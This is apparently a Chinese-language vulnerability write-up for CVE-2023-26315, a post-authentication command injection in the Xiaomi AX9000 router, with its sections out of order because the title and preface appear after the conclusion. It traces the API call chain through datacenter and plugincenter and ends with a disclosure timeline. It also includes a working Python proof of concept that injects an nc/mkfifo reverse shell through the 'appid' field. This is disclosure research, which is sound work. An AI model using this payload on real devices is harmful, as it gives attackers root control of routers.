
![](upload/attach/202405/949925_QNK6G33C5YTVPV9.webp)

`sub_1F1F8`函数看上去是做了一些编码转换的操作，可以猜测到这里就是做了`Base64`的解码工作。我们很容易根据其中抛出的异常信息确认我们的猜测，这里的确就是将`payload`字段内的`Json`数据进行了`Base64`解码。

![](upload/attach/202405/949925_JK5MJWGKYTS5QKJ.webp)

我们再返回到主函数，进而当`* (a2 + 8)`即传入的第一个参数`option`为`0`时，会执行到`sub_1BAE0`函数，根据上文分析，其参数`v11`就是解码后的`Json`字符串。

![](upload/attach/202405/949925_6Q48UGREBN9QN4V.webp)

在`sub_1BAE0`函数中，创建了`socket`，结合传入的参数（上级的`v11`变量）是`Json`字符串，很容易判断出此处会将`payload`字段的`Json`数据发送给本地`127.0.0.1`的`9090`端口（这里保护了端口的安全性，没有对外开放，我们想要找到未授权口而悬着的心也终于死了）。

![](upload/attach/202405/949925_4Y7C5GMADEY26G4.webp)

`/usr/sbin/datacenter`程序一直挂在进程中，监听着`9090`端口，故我们的数据被传到了`datacenter`程序进一步处理。

![](upload/attach/202405/949925_6UMRQ8MR6FF5KVH.webp)

在`datacenter`的`constructAPIMappingTable()`函数里分别执行了三个类的`sConstructMappingTable()`函数。

![](upload/attach/202405/949925_6NUA3B4KHQ76U2S.webp)

其中，都是通过`STL map`建立起了`api`编号（下文解释）和对应的处理函数`handler`间的映射关系。具体来看，有一些`api`是直接在`datacenter`中被处理的，有些是被进一步转发到了`/usr/sbin/indexservice`（`9088`端口）处理，另外一些则是被转发到了`/usr/sbin/plugincenter`（`9091`端口）中进一步处理。

我们在这里直接定位到该漏洞对应的`api`，在`datacenter::PluginApiCollection::sConstructMappingTable`中，当`api`为`629`的时候，对应的`handler`是`callPluginCenter`，其实从函数名就能看出来作用了，就是转发给`plugincenter`。

![](upload/attach/202405/949925_HCNUEBRU5VBKTAB.webp)

进去简单看一下，的确是发送给了本地的`9091`端口（同样，容易在`plugincenter`程序中找到，其监听着`9091`端口）。

![](upload/attach/202405/949925_6MCFS2S8HMQ54BT.webp)

在`DataCenterHandler::request`函数中，在调用`APIMapping::APIMapping`函数建立好上述的映射关系表后，紧接着调用了`APIMapping::redirectRequest`函数。其中，先获取了`Json`对象中的`api`字段的值，存放在`v8`变量中，然后经历了一个`for`循环，其中有对`v8`值的判断比较，最后执行了一个函数指针。这里需要稍微解释一下，此处的`a1`就是上面建立的`map`映射表，类型是`std::map<int,void (*)(json_object *,std::string &)>`，即第一个元素（键值）是整数，第二个元素（实值）是函数指针。所以此处的`for`循环就是对`map`的操作，但是都是用的偏移值，不好看出来具体是什么，其实这里也没必要去查源码，我们直接自己写一个`map`容器的遍历，然后静态编译出来，反编译后这些偏移值的含义也就都清楚了。此处的`for`循环其实就是执行了`map.find()`的操作，寻找了`map`中`key`为`v8`（即`api`值）的迭代器，偏移`+32`就是第一个键值元素（`api`值），偏移`+40`则是第二个实值元素（`handler`的函数指针）。显然，此处就是根据传入的`api`字段值调用对应的`handler`的过程。到这里，上述建立的`Mapping Table`中的映射关系也更加明朗了。

![](upload/attach/202405/949925_C8983JF7FWEH9V2.webp)

上文说过，当`api`为`629`时，传入的`payload`字段的数据会被转发给`plugincenter`程序处理。所以最后来到了`/usr/sbin/plugincenter`程序中，找到`datacenter::PluginApiMappingExtendCollection::sConstructMappingTable`函数，仍然是通过`map`建立了`api`编号和对应`handler`函数的映射关系。可以看到，当`api`编号为`629`的时候，会执行到`parseGetIdForVendor`函数进行处理。

![](upload/attach/202405/949925_85ZQ87PDWVNFHT8.webp)

在`parseGetIdForVendor`函数中，会将传入的`Json`数据内的`appid`字段作为参数传递到`PluginApi::getIdForVendor`函数中。

![](upload/attach/202405/949925_ZG7JNPRDV2E42PY.webp)

在`PluginApi::getIdForVendor`函数中，可以很明显地发现：**即使`appid`字段合法性检查不通过，也会被拼接入命令中并执行**。显然，这里是一个开发上的疏忽，在判断`!IsValidAppId`的条件分支内，在输出报错信息后，应当在最后加上`return ;`返回，不能继续执行下去。

![](upload/attach/202405/949925_8FF3CCCTEN4G28E.webp)

因此，这里存在一个命令注入漏洞，该漏洞调用链至此分析完毕。

## PoC及演示结果

这里需要自行更改一下相关`IP`和`Token`值，此处注入了反弹`shell`的命令，端口`8888`。

```python
import requests
server_ip = "192.168.50.1"
client_ip = "192.168.50.105"
token = "814c55713043e7358d3c1f42f2a98438"
nc_shell = ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} 8888 >/tmp/f;".format(client_ip)
res = requests.post("http://{}/cgi-bin/luci/;stok={}/api/xqdatacenter/request".format(server_ip, token), data={'payload':'{"api":629, "appid":"' + nc_shell + '"}'})
print(res.text)
```

![](upload/attach/202405/949925_RGE9GXZK2AWHXNV.webp)

## 写在最后

此篇文章仅作抛砖引玉，在`datacenter`，`plugincenter`以及`indexservice`内不同`api`的`handler`函数可能就有几百个（当然这里可以结合`fuzz`），以及`thriftunnel`的其他`option`操作也这么往下挖下去，我想应该也会存在漏洞。笔者也只是在小米当时赏金活动那几天大概看了看，后续也没再继续深入看这些地方了，本来想留着后面继续挖的，但是准备了一年保研感觉心态发生了一些奇妙的变化，研究生可能更想去尝试下其他更深入的方面，不想再做单纯的这样挖洞了，所以也就放出来了。感兴趣的读者可继续探索，挖到了也可以分享在评论区。

最后的最后，感谢小米对漏洞给予了丰厚的赏金，以及本篇小水文首发的平台“奇安信攻防社区”给予了丰厚的稿费，并同意三天后可转发至其他平台。笔者接触安全的这两年多时间里，最早使用的论坛就是看雪，在看雪也认识了不少小伙伴，所以偶尔写的还算说得过去的文章肯定是要转一份到看雪的。

## 时间线

2023-03-26 - 提交漏洞报告至小米安全中心（Xiaomi Security Center）

2023-04-03 - 厂商验证后确认两个漏洞存在，并开始修复漏洞

2023-05-24 - 两个漏洞的赏金均到账（活动期间还翻倍了，挺爽）

2023-06-09 - 厂商告知漏洞已全部修复完成（但似乎补丁未立即发布）

2024-05-09 - 联系厂商分配其中一个漏洞编号 CVE-2023-26315 并披露

2024-06-12 - CNVD 收录本文漏洞，分配编号 CNVD-2024-23093 并公开

***

**彩蛋：** 好吧，水文章的时候需要看着固件水，于是写到这里又水沝淼㵘了一个。嘶，太水了，有辱斯文，有辱斯文，金盆洗手，到此为止了（逃

![](upload/attach/202405/949925_8HB5ZRXK3W3DRX3.webp)

# 小米AX9000路由器CVE-2023-26315漏洞挖掘

> 本文由笔者首发于奇安信攻防社区：[340K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3L8%4u0#2L8g2)9J5k6h3u0#2N6r3W2S2L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4Z5j5i4u0W2i4K6u0r3x3K6l9H3x3l9`.`.](https://bbs.kanxue.com/elink@cffK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3L8%4u0#2L8g2)9J5k6h3u0#2N6r3W2S2L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4Z5j5i4u0W2i4K6u0r3x3K6l9H3x3l9`.`.)

## 前言

一年多前，看到小米`SRC`公众号推文搞了个赏金活动，于是挖了挖当时比较新的一款`AX9000`路由器，挖到了两个命令注入漏洞，不过没什么本事，挖的都是授权后的，危害一般。小米给的赏金还是很可观的，但是补丁发布的速度不知为何比较慢（交了这么多厂商，还是`Zyxel`和华硕的响应速度最快），所以一直也没能分配`CVE`编号，我也遵守小米的规定在漏洞披露前未公开相关漏洞细节。

直到最近和其他朋友聊起这个漏洞，才想起来已经过去了一年多，应该是能公开了，于是又去找了小米`SRC`的运营小姐姐。经过一些流程的审批，得知这两个漏洞的确是已经推送完补丁可以披露了。不过有趣的是，小米申请的`2023`的`CVE`编号只剩一个了，`2024`的新编号还没申请，于是只先分配了一个漏洞的`CVE`，还有一个得等新编号。

正好和朋友聊到这个漏洞，也顺带回忆并简单记录了一下，想着既然写了就发出来吧。我这里也就先公开一个漏洞吧，另外一个后面看情况。时间有限，写的比较简略，希望能给各位师傅带来些许启发。

之后，可能会整理一些漏洞报告以及自己写的小工具放在我的`Github`上：[175K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6%4K9h3&6E0N6l9`.`.](https://bbs.kanxue.com/elink@60fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6%4K9h3&6E0N6l9`.`.)

## 漏洞信息

**漏洞编号：** [CVE-2023-26315](https://bbs.kanxue.com/elink@9eaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0N6X3g2Q4x3X3g2G2M7X3N6Q4x3V1k6o6g2V1g2d9k6h3y4G2M7X3c8Q4x3@1k6A6k6q4)9K6c8p5y4h3c8g2)9J5k6o6t1H3x3U0y4Q4x3X3b7J5y4U0x3I4y4b7`.`.) / [CNVD-2024-23093](https://bbs.kanxue.com/elink@4b5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8Y4k6V1i4K6u0W2L8%4u0Y4i4K6u0W2j5$3&6Q4x3V1k6X3L8r3q4%4i4K6u0r3M7$3S2G2N6#2)9J5c8V1y4z5g2V1c8Q4x3X3b7J5x3o6t1@1i4K6u0V1x3U0x3H3z5e0x3`.)

**厂商致谢：**

[141K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1M7Y4g2K6N6q4)9J5k6h3#2A6i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8o6e0W2)9J5c8X3#2A6M7%4u0U0i4K6u0r3j5Y4g2D9L8r3g2@1K9h3&6K6i4K6u0r3j5h3c8$3K9i4y4G2M7Y4W2Q4x3@1k6U0N6X3g2u0k6q4)9K6c8o6f1@1y4R3`.`.](https://bbs.kanxue.com/elink@dbaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1M7Y4g2K6N6q4)9J5k6h3#2A6i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8o6e0W2)9J5c8X3#2A6M7%4u0U0i4K6u0r3j5Y4g2D9L8r3g2@1K9h3&6K6i4K6u0r3j5h3c8$3K9i4y4G2M7Y4W2Q4x3@1k6U0N6X3g2u0k6q4)9K6c8o6f1@1y4R3`.`.)

[d58K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1M7Y4g2K6N6q4)9J5k6h3#2A6i4K6u0W2j5$3!0E0i4K6u0r3L8h3W2K6M7X3y4Q4x3V1k6T1N6h3I4D9k6i4c8A6L8Y4y4Q4x3V1k6S2k6s2k6A6M7$3!0J5P5g2)9K6c8X3y4$3k6f1W2V1i4K6y4p5y4e0b7$3](https://bbs.kanxue.com/elink@6b4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1M7Y4g2K6N6q4)9J5k6h3#2A6i4K6u0W2j5$3!0E0i4K6u0r3L8h3W2K6M7X3y4Q4x3V1k6T1N6h3I4D9k6i4c8A6L8Y4y4Q4x3V1k6S2k6s2k6A6M7$3!0J5P5g2)9K6c8X3y4$3k6f1W2V1i4K6y4p5y4e0b7$3)

**漏洞描述：** 小米`AX9000`路由器在`1.0.168`版本及之前存在二进制漏洞（命令注入），该漏洞由于未对非法的`appid`做出有效限制而引起。已授权登录的攻击者在成功利用此漏洞后，可在远程目标设备上执行任意命令，并获得设备的最高控制权，造成权限提升。

BUT，怎么算`CVSS Score`应该都是`7.2+`高危，不太清楚官方的`6.5`是咋算的了QAQ

![](https://bbs.kanxue.com/upload/attach/202405/949925_WYQX2RZ2S44H92E.webp)

关于修复后的`1.0.174`版本的固件，厂商说明目前已经直接由云端推送补丁。

## 准备工作

首先，可以从官网下载对应版本的固件：[小米路由器AX9000 稳定版 1.0.168](https://bbs.kanxue.com/elink@619K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0k6r3&6Q4x3X3g2U0L8X3u0B7x3g2)9J5k6h3k6V1M7#2)9J5k6h3q4H3K9g2)9J5k6h3#2A6i4K6u0V1K9h3#2Y4i4K6u0W2j5$3!0E0i4K6u0r3P5r3W2S2L8%4q4A6j5h3&6Y4i4K6u0r3M7X3!0E0i4K6u0r3M7X3p5%4x3q4)9J5c8X3#2A6N6$3W2X3K9g2)9#2k6Y4u0S2y4K6m8Q4y4h3k6X3K9i4u0E0N6$3q4J5k6g2)9#2k6X3y4U0y4o6t1@1i4K6g2X3x3g2)9J5k6e0m8Q4x3X3f1I4y4U0S2Q4x3X3g2T1K9h3^5`.)

小米的固件最外面用的是`UBIFS`文件系统，固件本身没有加密，先用`binwalk`解出一个`.ubi`文件，然后用`ubireader_extract_images xxx.ubi`，可以在`ubifs-root`内解出三个`.ubifs`文件，对其中的`xxx-ubi_rootfs.ubifs`用`binwalk`再解开，即可得到里面的`SquashFS`文件系统，也就是核心部分。
